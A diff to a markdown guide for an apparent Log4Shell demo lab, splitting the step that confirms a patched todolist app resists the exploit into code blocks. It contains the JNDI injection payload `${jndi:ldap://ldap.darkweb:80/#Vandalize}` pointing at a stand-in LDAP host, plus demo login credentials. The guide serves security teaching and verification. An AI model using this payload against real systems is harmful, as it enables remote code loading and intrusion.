@@ -31,7 +31,21 @@ kubectl scale deployment todolist --replicas=1
 
 ## Verify the Exploit no longer works
 
-Refresh your broweser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string: `${jndi:ldap://ldap.darkweb:80/#Vandalize}`.
+Refresh your broweser tab on the todolist app and log back in (user: foo@bar.org, password: foobar) and submit the same JDNI search string:
+
+* User:
+```bash
+foo@bar.org
+```
+* Password:
+```bash
+foobar
+```
+Enter search string
+```bash
+${jndi:ldap://ldap.darkweb:80/#Vandalize}
+```
+
 The page will not show the graphiti because the newer version on Log4J no longer is vulnerable!
 
 ![todolist-fixed](/images/todolist-fixed.png)
